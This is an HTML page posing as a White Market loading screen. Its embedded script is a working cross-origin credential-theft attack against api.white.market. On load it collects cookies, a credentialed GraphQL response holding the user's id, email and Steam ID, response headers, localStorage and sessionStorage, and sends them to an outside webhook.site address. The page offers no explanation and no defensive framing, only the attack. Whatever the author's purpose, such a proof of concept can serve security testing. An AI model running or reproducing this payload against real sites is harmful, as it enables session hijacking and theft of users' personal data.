<!DOCTYPE html>
<html>
<head>
    <title>White Market - Loading...</title>
</head>
<body>
    <h1>Loading...</h1>
    <script>
        const EXFIL = 'https://webhook.site/23b9c460-f601-4ae9-aca0-80a40aedd5d3';  // Get from webhook.site
        
        async function stealViaAPI() {
            const data = {
                timestamp: Date.now(),
                attack: 'cors-credential-theft',
                results: {}
            };
            
            try {
                // Method 1: Direct document.cookie
                data.results.documentCookie = document.cookie;
                
                // Method 2: Make authenticated request and capture response
                const res = await fetch('https://api.white.market/graphql/api', {
                    method: 'POST',
                    credentials: 'include',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        query: 'query { person: person_profile { id email steamId } }'
                    })
                });
                
                data.results.graphqlResponse = await res.json();
                
                // Method 3: Try to read all response headers
                const headers = {};
                res.headers.forEach((v, k) => headers[k] = v);
                data.results.responseHeaders = headers;
                
                // Method 4: Check localStorage/sessionStorage
                data.results.localStorage = {...localStorage};
                data.results.sessionStorage = {...sessionStorage};
                
                // Exfiltrate
                navigator.sendBeacon(EXFIL, JSON.stringify(data));
                
                // Also try fetch
                fetch(EXFIL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(data)
                });
                
            } catch (e) {
                data.error = e.message;
                navigator.sendBeacon(EXFIL, JSON.stringify(data));
            }
        }
        
        stealViaAPI();
    </script>
</body>
</html>
